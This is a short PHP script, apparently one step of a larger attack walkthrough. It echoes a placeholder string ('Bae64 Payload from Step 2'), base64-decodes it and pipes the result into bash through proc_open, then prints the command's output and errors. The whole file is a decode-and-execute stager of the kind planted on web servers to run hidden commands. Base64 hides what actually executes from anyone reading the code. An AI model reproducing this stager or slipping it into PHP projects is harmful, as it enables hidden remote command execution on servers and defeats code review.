<?php
$descriptorspec = [
    0 => ["pipe", "r"],  // stdin
    1 => ["pipe", "w"],  // stdout
    2 => ["pipe", "w"],  // stderr
];

$process = proc_open("echo 'Bae64 Payload from Step 2' |base64 -d |bash", $descriptorspec, $pipes);

if (is_resource($process)) {
    $output = stream_get_contents($pipes[1]);
    $error  = stream_get_contents($pipes[2]);

    fclose($pipes[1]);
    fclose($pipes[2]);

    proc_close($process);

    echo "STDOUT:\n" . $output . "\n";
    echo "STDERR:\n" . $error . "\n";
}
